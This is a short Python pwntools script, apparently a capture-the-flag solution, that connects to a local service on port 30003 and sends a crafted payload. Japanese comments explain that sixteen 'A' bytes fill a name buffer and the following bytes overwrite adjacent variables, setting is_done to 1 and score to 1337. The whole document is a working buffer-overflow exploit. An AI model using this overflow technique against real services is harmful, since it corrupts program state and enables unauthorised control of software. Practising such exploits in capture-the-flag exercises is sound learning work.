from pwn import *

ADDR = '127.0.0.1'
PORT = 30003

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16 # name用の部分を全部埋める
payload += b'\x01\x00\x00\x00' # is_doneに1を入れる
payload += b'\x37\x13\x00\x00' # scoreに1337を入れる

io.sendline(payload)
io.interactive()
